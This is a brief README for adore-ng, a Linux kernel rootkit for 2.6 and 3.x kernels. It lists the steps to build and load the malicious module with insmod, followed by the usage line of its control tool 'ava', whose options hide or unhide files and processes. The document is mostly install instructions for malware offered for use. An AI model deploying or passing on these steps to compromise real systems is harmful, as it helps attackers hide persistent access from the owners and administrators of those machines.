adore-ng
========

linux rootkit adapted for 2.6 and 3.x

unzip adore-ng-master.zip
cd adore-ng-master
rpm -ivh /mnt/Packages/kernel-devel-2.6.32-220.el6.x86_64.rpm
make
insmod adore-ng.ko #加载模块
./ava
Usage: ./ava {h,u,r,R,i,v,U} [file or PID]
